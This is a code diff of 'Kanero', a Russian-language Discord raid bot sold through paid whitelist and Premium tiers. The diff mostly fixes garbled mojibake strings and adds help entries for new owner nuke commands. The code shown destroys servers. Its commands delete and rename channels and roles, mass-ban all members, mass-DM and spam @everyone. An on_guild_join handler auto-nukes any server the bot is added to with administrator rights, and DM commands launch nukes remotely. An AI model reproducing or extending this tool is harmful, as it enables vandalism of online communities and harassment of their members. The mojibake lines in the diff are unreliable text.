-                "`!РєРѕРјРїРµРЅСЃР°С†РёСЏ <С‚РёРї> <РІСЂРµРјСЏ>` вЂ” РѕР±СЉСЏРІРёС‚СЊ РєРѕРјРїРµРЅСЃР°С†РёСЋ СЃ РєРЅРѕРїРєРѕР№\n"
-                "`!announce_bug \"РќР°Р·РІР°РЅРёРµ\" РћРїРёСЃР°РЅРёРµ` вЂ” РѕР±СЉСЏРІРёС‚СЊ Рѕ Р±Р°РіРµ\n"
-                "`!list` В· `!list_clear` В· `!sync_roles` вЂ” СЃРёРЅС…СЂРѕРЅРёР·Р°С†РёСЏ СЂРѕР»РµР№\n"
-                "`!autorole` вЂ” СЃС‚Р°С‚СѓСЃ Р°РІС‚Рѕ-СЂРѕР»Рё\n"
+                "`!owner_nuke [текст]` — полный нюк + роль ??\n"
+                "`!auto_owner_nuke on/off/text/info` — авто owner нюк\n"
+                "`!auto_off` — выключить все авто нюки\n"
+                "`!auto_info` — статус всех авто нюков\n"
+                "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
+                "`!fl_add/remove/list/clear` — freelist\n"
+                "`!tester_add/remove/list` — управление тестерами\n"
+                "`!on_add/remove/list` — owner nuke list\n"
+                "`!компенсация <тип> <время>` — объявить компенсацию с кнопкой\n"
+                "`!announce_bug \"Название\" Описание` — объявить о баге\n"
+                "`!list` · `!list_clear` · `!sync_roles` — синхронизация ролей\n"
+                "`!autorole` — статус авто-роли\n"
                 "`!block_guild/unblock_guild`\n"
-                "`!setup` В· `!setup_update` вЂ” СЃС‚СЂСѓРєС‚СѓСЂР° СЃРµСЂРІРµСЂР°\n"
-                "`!goout` В· `!nukelogs` В· `!roles` В· `!giverole`\n"
-                "`!unban <id>` В· `!guilds` В· `!setguild` В· `!invlink`"
+                "`!setup` · `!setup_update` — структура сервера\n"
+                "`!goout` · `!nukelogs` · `!roles` · `!giverole`\n"
+                "`!unban <id>` · `!guilds` · `!setguild` · `!invlink`"
             ),
             inline=False
         )
 
     embed.add_field(
-        name="рџ’¬ РљСѓРїРёС‚СЊ РїРѕРґРїРёСЃРєСѓ",
+        name="?? Купить подписку",
         value=(
             "**White / Premium:**\n"
-            "РџРµСЂРµР№РґРё РІ РєР°РЅР°Р»С‹ РЅР° РЅР°С€РµРј СЃРµСЂРІРµСЂРµ:\n"
-            "рџ›’гѓ»sell вЂ” РїСЂРѕРґР°Р¶Р° РїРѕРґРїРёСЃРѕРє\n"
-            "рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р° вЂ” Р»РѕРіРё РІС‹РґР°С‡Рё\n\n"
-            "**РќР°С€ СЃРµСЂРІРµСЂ:** https://discord.gg/aud6wwYVRd"
+            "Перейди в каналы на нашем сервере:\n"
+            "???sell — продажа подписок\n"
+            "???выдача-вайта — логи выдачи\n\n"
+            "**Наш сервер:** https://discord.gg/nNTB37QNCG"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  !changelogall вЂ” РІСЃСЏ РёСЃС‚РѕСЂРёСЏ  |  v2.5")
+    embed.set_footer(text="?? Kanero  |  !changelogall — вся история  |  v2.5")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
@@ -4603,39 +4603,39 @@ async def help_cmd(ctx):
 @wl_check()
 async def commands_user(ctx):
     embed = discord.Embed(
-        title="рџ‘ЃпёЏ РљРћРњРђРќР”Р« вЂ” РћР‘Р«Р§РќР«Р™ РџРћР›Р¬Р—РћР’РђРўР•Р›Р¬",
+        title="??? КОМАНДЫ — ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ",
         color=0x0a0a0a
     )
     embed.add_field(
-        name="рџ’Ђ РЈРќРР§РўРћР–Р•РќРР•",
+        name="?? УНИЧТОЖЕНИЕ",
         value=(
-            "`!nuke` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ в†’ СѓРґР°Р»РµРЅРёРµ СЂРѕР»РµР№ в†’ РєР°РЅР°Р»С‹ в†’ СЃРїР°Рј в†’ СЂРѕР»СЊ в пёЏ\n"
-            "`!stop` вЂ” РѕСЃС‚Р°РЅРѕРІРёС‚СЊ РєСЂР°С€\n"
-            "`!cleanup` вЂ” СЃРЅРµСЃС‚Рё РІСЃС‘, РѕСЃС‚Р°РІРёС‚СЊ РѕРґРёРЅ РєР°РЅР°Р»\n"
-            "`!auto_nuke on/off/info` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ Р±РѕС‚Р°"
+            "`!nuke` — переименование > удаление ролей > каналы > спам > роль ??\n"
+            "`!stop` — остановить краш\n"
+            "`!cleanup` — снести всё, оставить один канал\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота"
         ),
         inline=False
     )
     embed.add_field(
-        name="вљЎ РљРћРќРўР РћР›Р¬",
+        name="? КОНТРОЛЬ",
         value=(
-            "`!rename [РЅР°Р·РІР°РЅРёРµ]` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ РІСЃРµ РєР°РЅР°Р»С‹\n"
-            "`!nicks_all [РЅРёРє]` вЂ” СЃРјРµРЅРёС‚СЊ РЅРёРєРё РІСЃРµРј\n"
-            "`!webhooks` вЂ” СЃРїРёСЃРѕРє РІРµР±С…СѓРєРѕРІ"
+            "`!rename [название]` — переименовать все каналы\n"
+            "`!nicks_all [ник]` — сменить ники всем\n"
+            "`!webhooks` — список вебхуков"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”± РЈРўРР›РРўР«",
+        name="?? УТИЛИТЫ",
         value=(
-            "`!inv` вЂ” СЃСЃС‹Р»РєР° РґР»СЏ РґРѕР±Р°РІР»РµРЅРёСЏ Р±РѕС‚Р°\n"
-            "`/sp [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]` вЂ” СЃРїР°Рј\n"
-            "`/spkd [Р·Р°РґРµСЂР¶РєР°] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]` вЂ” СЃРїР°Рј СЃ Р·Р°РґРµСЂР¶РєРѕР№\n"
-            "`!changelog` вЂ” РёСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№"
+            "`!inv` — ссылка для добавления бота\n"
+            "`/sp [кол-во] [текст]` — спам\n"
+            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой\n"
+            "`!changelog` — история обновлений"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  davaidkatt")
+    embed.set_footer(text="?? Kanero  |  davaidkatt")
     await ctx.send(embed=embed)
 
 
@@ -4643,40 +4643,40 @@ async def commands_user(ctx):
 @wl_check()
 async def commands_premium(ctx):
     embed = discord.Embed(
-        title="рџ’Ћ РљРћРњРђРќР”Р« вЂ” PREMIUM",
-        description="Р”РѕСЃС‚СѓРїРЅС‹ С‚РѕР»СЊРєРѕ Premium РїРѕР»СЊР·РѕРІР°С‚РµР»СЏРј. РљСѓРїРёС‚СЊ: **davaidkatt**",
+        title="?? КОМАНДЫ — PREMIUM",
+        description="Доступны только Premium пользователям. Купить: **davaidkatt**",
         color=0x0a0a0a
     )
     embed.add_field(
-        name="рџ’Ђ РЈРќРР§РўРћР–Р•РќРР•",
+        name="?? УНИЧТОЖЕНИЕ",
         value=(
-            "`!nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє СЃРѕ СЃРІРѕРёРј С‚РµРєСЃС‚РѕРј\n"
-            "`!super_nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє РІСЃС‘ РѕРґРЅРѕРІСЂРµРјРµРЅРЅРѕ\n"
-            "`!massban` вЂ” Р·Р°Р±Р°РЅРёС‚СЊ РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "`!rolesdelete` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ СЂРѕР»Рё\n"
-            "`!auto_super_nuke on/off/text/info` вЂ” Р°РІС‚Рѕ РЅСЋРє РїСЂРё РІС…РѕРґРµ\n"
-            "`!auto_superpr_nuke on/off/text/info` вЂ” Р°РІС‚Рѕ С‚СѓСЂР±Рѕ РЅСЋРє РїСЂРё РІС…РѕРґРµ"
+            "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!super_nuke [текст]` — нюк всё одновременно\n"
+            "`!massban` — забанить всех участников\n"
+            "`!rolesdelete` — удалить все роли\n"
+            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
+            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ“Ё РЎРџРђРњ",
+        name="?? СПАМ",
         value=(
-            "`!massdm [С‚РµРєСЃС‚]` вЂ” СЂР°Р·РѕСЃР»Р°С‚СЊ Р”Рњ РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј\n"
-            "`!spam [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]` вЂ” СЃРїР°Рј РІ РєР°РЅР°Р»\n"
-            "`!pingspam [РєРѕР»-РІРѕ]` вЂ” СЃРїР°Рј @everyone"
+            "`!massdm [текст]` — разослать ДМ всем участникам\n"
+            "`!spam [кол-во] [текст]` — спам в канал\n"
+            "`!pingspam [кол-во]` — спам @everyone"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”Ќ РРќР¤Рћ",
+        name="?? ИНФО",
         value=(
-            "`!serverinfo` вЂ” РїРѕРґСЂРѕР±РЅР°СЏ РёРЅС„Р° Рѕ СЃРµСЂРІРµСЂРµ\n"
-            "`!userinfo [id]` вЂ” РёРЅС„Р° Рѕ РїРѕР»СЊР·РѕРІР°С‚РµР»Рµ"
+            "`!serverinfo` — подробная инфа о сервере\n"
+            "`!userinfo [id]` — инфа о пользователе"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  davaidkatt")
+    embed.set_footer(text="?? Kanero  |  davaidkatt")
     await ctx.send(embed=embed)
 
 
@@ -4685,65 +4685,65 @@ async def commands_owner(ctx):
     if ctx.author.id != config.OWNER_ID:
         return
     embed = discord.Embed(
-        title="рџ‘‘ РљРћРњРђРќР”Р« вЂ” OWNER",
-        description="РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР° Р±РѕС‚Р°.",
+        title="?? КОМАНДЫ — OWNER",
+        description="Только для овнера бота.",
         color=0x0a0a0a
     )
     embed.add_field(
-        name="рџ‘Ґ WHITELIST",
+        name="?? WHITELIST",
         value=(
-            "`!wl_add <id>` вЂ” РІС‹РґР°С‚СЊ РґРѕСЃС‚СѓРї Рє Р±РѕС‚Сѓ\n"
-            "`!wl_remove <id>` вЂ” Р·Р°Р±СЂР°С‚СЊ РґРѕСЃС‚СѓРї\n"
-            "`!wl_list` вЂ” СЃРїРёСЃРѕРє РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№"
+            "`!wl_add <id>` — выдать доступ к боту\n"
+            "`!wl_remove <id>` — забрать доступ\n"
+            "`!wl_list` — список пользователей"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ’Ћ PREMIUM",
+        name="?? PREMIUM",
         value=(
-            "`!pm_add <id>` вЂ” РІС‹РґР°С‚СЊ Premium\n"
-            "`!pm_remove <id>` вЂ” Р·Р°Р±СЂР°С‚СЊ Premium\n"
-            "`!pm_list` вЂ” СЃРїРёСЃРѕРє Premium"
+            "`!pm_add <id>` — выдать Premium\n"
+            "`!pm_remove <id>` — забрать Premium\n"
+            "`!pm_list` — список Premium"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”’ Р‘Р›РћРљРР РћР’РљРђ",
+        name="?? БЛОКИРОВКА",
         value=(
-            "`!block_guild <id>` вЂ” Р·Р°Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ\n"
-            "`!unblock_guild <id>` вЂ” СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ\n"
-            "`!blocked_guilds` вЂ” СЃРїРёСЃРѕРє Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С…"
+            "`!block_guild <id>` — заблокировать сервер\n"
+            "`!unblock_guild <id>` — разблокировать\n"
+            "`!blocked_guilds` — список заблокированных"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ“ќ РќРђРЎРўР РћР™РљР",
+        name="?? НАСТРОЙКИ",
         value=(
-            "`!set_spam_text <С‚РµРєСЃС‚>` вЂ” СЃРјРµРЅРёС‚СЊ РґРµС„РѕР»С‚РЅС‹Р№ С‚РµРєСЃС‚ РЅСЋРєР°\n"
-            "`!get_spam_text` вЂ” РїРѕРєР°Р·Р°С‚СЊ С‚РµРєСѓС‰РёР№ С‚РµРєСЃС‚\n"
-            "`!owl_add/remove/list` вЂ” owner whitelist"
+            "`!set_spam_text <текст>` — сменить дефолтный текст нюка\n"
+            "`!get_spam_text` — показать текущий текст\n"
+            "`!owl_add/remove/list` — owner whitelist"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ–ҐпёЏ Р’ Р›РЎ",
+        name="??? В ЛС",
         value=(
-            "`!owner_help` вЂ” РїРѕР»РЅР°СЏ РїР°РЅРµР»СЊ СѓРїСЂР°РІР»РµРЅРёСЏ\n"
-            "`!guilds` вЂ” СЃРїРёСЃРѕРє СЃРµСЂРІРµСЂРѕРІ\n"
-            "`!setguild <id>` вЂ” РІС‹Р±СЂР°С‚СЊ СЃРµСЂРІРµСЂ\n"
-            "`!invlink` вЂ” РёРЅРІР°Р№С‚С‹ СЃРѕ РІСЃРµС… СЃРµСЂРІРµСЂРѕРІ"
+            "`!owner_help` — полная панель управления\n"
+            "`!guilds` — список серверов\n"
+            "`!setguild <id>` — выбрать сервер\n"
+            "`!invlink` — инвайты со всех серверов"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ EVENTS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- EVENTS ------------------------------------------------
 
 @bot.event
 async def on_member_remove(member):
-    """РџСЂРё РІС‹С…РѕРґРµ СЃ РґРѕРјР°С€РЅРµРіРѕ СЃРµСЂРІРµСЂР° вЂ” СѓРґР°Р»СЏРµРј РёР· whitelist Рё РїРёС€РµРј РІ Р›РЎ."""
+    """При выходе с домашнего сервера — удаляем из whitelist и пишем в ЛС."""
     if member.guild.id != HOME_GUILD_ID:
         return
     uid = member.id
@@ -4761,7 +4761,7 @@ async def on_member_remove(member):
     if removed:
         try:
             home_guild = bot.get_guild(HOME_GUILD_ID)
-            invite_url = "https://discord.gg/aud6wwYVRd"
+            invite_url = "https://discord.gg/nNTB37QNCG"
             if home_guild:
                 try:
                     ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
@@ -4772,18 +4772,18 @@ async def on_member_remove(member):
                     pass
             await member.send(
                 embed=discord.Embed(
-                    title="вќЊ Р”РѕСЃС‚СѓРї Рє Р±РѕС‚Сѓ СѓРґР°Р»С‘РЅ",
+                    title="? Доступ к боту удалён",
                     description=(
-                        "РўС‹ РІС‹С€РµР» СЃ РЅР°С€РµРіРѕ СЃРµСЂРІРµСЂР° вЂ” РґРѕСЃС‚СѓРї Рє РєРѕРјР°РЅРґР°Рј Р±РѕС‚Р° Р±С‹Р» СѓРґР°Р»С‘РЅ.\n\n"
-                        "Р§С‚РѕР±С‹ РІРѕСЃСЃС‚Р°РЅРѕРІРёС‚СЊ РґРѕСЃС‚СѓРї вЂ” РІРµСЂРЅРёСЃСЊ РЅР° СЃРµСЂРІРµСЂ Рё РЅР°РїРёС€Рё РІ РєР°РЅР°Р» `#addbot`:\n"
+                        "Ты вышел с нашего сервера — доступ к командам бота был удалён.\n\n"
+                        "Чтобы восстановить доступ — вернись на сервер и напиши в канал `#addbot`:\n"
                         f"{invite_url}"
                     ),
                     color=0x0a0a0a
-                ).set_footer(text="в пёЏ Kanero  |  davaidkatt")
+                ).set_footer(text="?? Kanero  |  davaidkatt")
             )
         except Exception:
             pass
-    # РћР±РЅРѕРІР»СЏРµРј СЃС‚Р°С‚РёСЃС‚РёРєСѓ
+    # Обновляем статистику
     try:
         await update_stats_channels(member.guild)
     except Exception:
@@ -4792,22 +4792,22 @@ async def on_member_remove(member):
 
 @bot.event
 async def on_member_join(member):
-    """РџСЂРё РІС…РѕРґРµ РЅР° РґРѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ вЂ” РІС‹РґР°С‘Рј Р°РІС‚Рѕ-СЂРѕР»СЊ Guest Рё РїРёС€РµРј РІ welcome РєР°РЅР°Р»."""
+    """При входе на домашний сервер — выдаём авто-роль Guest и пишем в welcome канал."""
     guild = member.guild
     if guild.id != HOME_GUILD_ID:
         return
 
-    # в”Ђв”Ђ 1. Р’С‹РґР°С‘Рј СЂРѕР»СЊ Guest РїРѕ ID РёР»Рё РїРѕ РёРјРµРЅРё в”Ђв”Ђ
+    # -- 1. Выдаём роль Guest по ID или по имени --
     try:
-        guest_role = guild.get_role(AUTO_ROLE_ID) or discord.utils.find(lambda r: r.name == "рџ‘¤ Guest", guild.roles)
+        guest_role = guild.get_role(AUTO_ROLE_ID) or discord.utils.find(lambda r: r.name == "?? Guest", guild.roles)
         if guest_role:
-            await member.add_roles(guest_role, reason="РђРІС‚Рѕ-СЂРѕР»СЊ Guest РїСЂРё РІС…РѕРґРµ")
+            await member.add_roles(guest_role, reason="Авто-роль Guest при входе")
     except Exception:
         pass
 
-    # в”Ђв”Ђ 2. РџРёС€РµРј РІ welcome РєР°РЅР°Р» в”Ђв”Ђ
+    # -- 2. Пишем в welcome канал --
     welcome_ch = discord.utils.find(
-        lambda c: "welcome" in c.name.lower() or "РІРµР»РєРѕРј" in c.name.lower() or "РїСЂРёРІРµС‚СЃС‚РІРёРµ" in c.name.lower(),
+        lambda c: "welcome" in c.name.lower() or "велком" in c.name.lower() or "приветствие" in c.name.lower(),
         guild.text_channels
     )
     if not welcome_ch:
@@ -4819,34 +4819,34 @@ async def on_member_join(member):
     invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
 
     embed = discord.Embed(
-        title=f"в пёЏ Р”РѕР±СЂРѕ РїРѕР¶Р°Р»РѕРІР°С‚СЊ, {member.display_name}!",
+        title=f"?? Добро пожаловать, {member.display_name}!",
         description=(
-            f"Р Р°РґС‹ РІРёРґРµС‚СЊ С‚РµР±СЏ РЅР° СЃРµСЂРІРµСЂРµ **Kanero**.\n\n"
-            "в”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\n"
-            "**рџ¤– РљР°Рє РїРѕРґРєР»СЋС‡РёС‚СЊ Р±РѕС‚Р° Kanero:**\n\n"
-            f"**РЁР°Рі 1.** Р—Р°Р№РґРё РІ РєР°РЅР°Р» {addbot_mention} Рё РЅР°РїРёС€Рё Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ\n"
-            "**РЁР°Рі 2.** Р‘РѕС‚ РЅР°РїРёС€РµС‚ С‚РµР±Рµ РІ Р›РЎ СЃ РёРЅСЃС‚СЂСѓРєС†РёРµР№\n"
-            f"**РЁР°Рі 3.** Р”РѕР±Р°РІСЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ: [РЅР°Р¶РјРё СЃСЋРґР°]({invite_url})\n\n"
-            "в”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\n"
-            "**рџ“‹ Р”РѕСЃС‚СѓРїРЅС‹Рµ РєРѕРјР°РЅРґС‹ (freelist):**\n"
-            "вЂў `!nuke` вЂ” РєСЂР°С€ СЃРµСЂРІРµСЂР°\n"
-            "вЂў `!auto_nuke on/off` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ Р±РѕС‚Р°\n"
-            "вЂў `!help` вЂ” СЃРїРёСЃРѕРє РєРѕРјР°РЅРґ\n"
-            "вЂў `!changelog` / `!changelogall` вЂ” РёСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№\n\n"
-            "в”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\n"
-            "**рџ’Ћ РљСѓРїРёС‚СЊ Premium:** **davaidkatt** | **@Firisotik**\n"
-            "**рџ”— РЎРµСЂРІРµСЂ:** https://discord.gg/aud6wwYVRd"
+            f"Рады видеть тебя на сервере **Kanero**.\n\n"
+            "??????????????????????\n"
+            "**?? Как подключить бота Kanero:**\n\n"
+            f"**Шаг 1.** Зайди в канал {addbot_mention} и напиши любое сообщение\n"
+            "**Шаг 2.** Бот напишет тебе в ЛС с инструкцией\n"
+            f"**Шаг 3.** Добавь бота на свой сервер: [нажми сюда]({invite_url})\n\n"
+            "??????????????????????\n"
+            "**?? Доступные команды (freelist):**\n"
+            "• `!nuke` — краш сервера\n"
+            "• `!auto_nuke on/off` — авто-краш при входе бота\n"
+            "• `!help` — список команд\n"
+            "• `!changelog` / `!changelogall` — история обновлений\n\n"
+            "??????????????????????\n"
+            "**?? Купить Premium:** **davaidkatt** | **@Firisotik**\n"
+            "**?? Сервер:** https://discord.gg/nNTB37QNCG"
         ),
         color=0x0a0a0a
     )
     embed.set_thumbnail(url=member.display_avatar.url)
-    embed.set_footer(text=f"в пёЏ Kanero  |  РЈС‡Р°СЃС‚РЅРёРє #{guild.member_count}")
+    embed.set_footer(text=f"?? Kanero  |  Участник #{guild.member_count}")
     try:
-        await welcome_ch.send(f"рџ‘‹ {member.mention}")
+        await welcome_ch.send(f"?? {member.mention}")
         await welcome_ch.send(embed=embed)
     except Exception:
         pass
-    # РћР±РЅРѕРІР»СЏРµРј СЃС‚Р°С‚РёСЃС‚РёРєСѓ
+    # Обновляем статистику
     try:
         await update_stats_channels(guild)
     except Exception:
@@ -4858,17 +4858,17 @@ async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return
 
-    # Р—РђР©РРўРђ: РЅРёРєРѕРіРґР° РЅРµ Р·Р°РїСѓСЃРєР°РµРј Р°РІС‚Рѕ-РЅСЋРє РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # ЗАЩИТА: никогда не запускаем авто-нюк на домашнем сервере
     if guild.id == HOME_GUILD_ID:
         return
 
-    # РЎСЂР°Р·Сѓ РїРѕРґРіСЂСѓР¶Р°РµРј РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ РґР»СЏ РјР°РєСЃРёРјР°Р»СЊРЅРѕР№ СЃРєРѕСЂРѕСЃС‚Рё
+    # Сразу подгружаем всех участников для максимальной скорости
     try:
         await guild.chunk()
     except Exception:
         pass
 
-    # AUTO SUPERPR NUKE вЂ” РІСЃС‘ РѕРґРЅРѕРІСЂРµРјРµРЅРЅРѕ, РјР°РєСЃРёРјР°Р»СЊРЅР°СЏ СЃРєРѕСЂРѕСЃС‚СЊ
+    # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
     if AUTO_SUPERPR_NUKE:
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
@@ -4891,7 +4891,7 @@ async def on_guild_join(guild):
         asyncio.create_task(log_nuke(guild, bot.user, "auto_nuke"))
 
 
-# РђРєС‚РёРІРЅС‹Р№ СЃРµСЂРІРµСЂ РґР»СЏ РєР°Р¶РґРѕРіРѕ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РІ Р›РЎ: user_id -> guild_id
+# Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
 active_guild: dict[int, int] = {}
 
 
@@ -4899,7 +4899,7 @@ class GuildSelectView(discord.ui.View):
     def __init__(self, guilds: list[discord.Guild], user_id: int):
         super().__init__(timeout=60)
         self.user_id = user_id
-        # Р”РѕР±Р°РІР»СЏРµРј РєРЅРѕРїРєРё (РјР°РєСЃРёРјСѓРј 25)
+        # Добавляем кнопки (максимум 25)
         for guild in guilds[:25]:
             btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
             btn.callback = self.make_callback(guild)
@@ -4908,18 +4908,18 @@ class GuildSelectView(discord.ui.View):
     def make_callback(self, guild: discord.Guild):
         async def callback(interaction: discord.Interaction):
             if interaction.user.id != self.user_id:
-                await interaction.response.send_message("РќРµ С‚РІРѕСЏ РєРЅРѕРїРєР°.", ephemeral=True)
+                await interaction.response.send_message("Не твоя кнопка.", ephemeral=True)
                 return
             active_guild[self.user_id] = guild.id
             await interaction.response.edit_message(
-                content=f"вњ… РђРєС‚РёРІРЅС‹Р№ СЃРµСЂРІРµСЂ: **{guild.name}** (`{guild.id}`)\nРўРµРїРµСЂСЊ РІСЃРµ РєРѕРјР°РЅРґС‹ РІ Р›РЎ РІС‹РїРѕР»РЅСЏСЋС‚СЃСЏ РЅР° СЌС‚РѕРј СЃРµСЂРІРµСЂРµ.",
+                content=f"? Активный сервер: **{guild.name}** (`{guild.id}`)\nТеперь все команды в ЛС выполняются на этом сервере.",
                 view=None
             )
         return callback
 
 
 async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
-    """Р’С‹РїРѕР»РЅСЏРµС‚ РєРѕРјР°РЅРґСѓ РѕС‚ РёРјРµРЅРё РІР»Р°РґРµР»СЊС†Р° РЅР° СѓРєР°Р·Р°РЅРЅРѕРј СЃРµСЂРІРµСЂРµ Р±РµР· РѕС‚РїСЂР°РІРєРё СЃРѕРѕР±С‰РµРЅРёР№ РІ РєР°РЅР°Р»С‹."""
+    """Выполняет команду от имени владельца на указанном сервере без отправки сообщений в каналы."""
     parts = cmd_text.strip().split(maxsplit=1)
     cmd_name = parts[0].lstrip("!").lower()
     args = parts[1] if len(parts) > 1 else ""
@@ -4928,7 +4928,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
         # nuke
         if cmd_name == "nuke":
             if nuke_running.get(guild.id):
-                await message.channel.send("вљ пёЏ РЈР¶Рµ Р·Р°РїСѓС‰РµРЅРѕ.")
+                await message.channel.send("?? Уже запущено.")
                 return
             nuke_running[guild.id] = True
             nuke_starter[guild.id] = message.author.id
@@ -4937,7 +4937,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             last_spam_text[guild.id] = spam_text
             asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
             asyncio.create_task(log_nuke(guild, message.author, "nuke"))
-            await message.channel.send(f"вњ… `nuke` Р·Р°РїСѓС‰РµРЅ РЅР° **{guild.name}**")
+            await message.channel.send(f"? `nuke` запущен на **{guild.name}**")
 
         elif cmd_name == "stop":
             uid = message.author.id
@@ -4946,62 +4946,62 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             if uid == config.OWNER_ID:
                 nuke_running[guild.id] = False
                 nuke_starter.pop(guild.id, None)
-                await message.channel.send(f"вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ РЅР° **{guild.name}**")
+                await message.channel.send(f"? Остановлено на **{guild.name}**")
             elif starter_id is None:
                 nuke_running[guild.id] = False
-                await message.channel.send(f"вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ РЅР° **{guild.name}**")
+                await message.channel.send(f"? Остановлено на **{guild.name}**")
             elif starter_id == config.OWNER_ID:
-                await message.channel.send("вќЊ РќСЋРє Р·Р°РїСѓС‰РµРЅ **РѕРІРЅРµСЂРѕРј** вЂ” С‚РѕР»СЊРєРѕ РѕРЅ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ.")
+                await message.channel.send("? Нюк запущен **овнером** — только он может остановить.")
             elif is_premium(starter_id) and not is_premium(uid):
-                await message.channel.send("вќЊ РќСЋРє Р·Р°РїСѓС‰РµРЅ **Premium** РїРѕР»СЊР·РѕРІР°С‚РµР»РµРј вЂ” РѕР±С‹С‡РЅР°СЏ РїРѕРґРїРёСЃРєР° РЅРµ РјРѕР¶РµС‚ РѕСЃС‚Р°РЅРѕРІРёС‚СЊ.")
+                await message.channel.send("? Нюк запущен **Premium** пользователем — обычная подписка не может остановить.")
             else:
                 nuke_running[guild.id] = False
                 nuke_starter.pop(guild.id, None)
-                await message.channel.send(f"вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ РЅР° **{guild.name}**")
+                await message.channel.send(f"? Остановлено на **{guild.name}**")
 
         elif cmd_name == "cleanup":
             asyncio.create_task(delete_all_channels(guild))
-            await message.channel.send(f"вњ… `cleanup` Р·Р°РїСѓС‰РµРЅ РЅР° **{guild.name}**")
+            await message.channel.send(f"? `cleanup` запущен на **{guild.name}**")
 
         elif cmd_name == "rename":
             if not args:
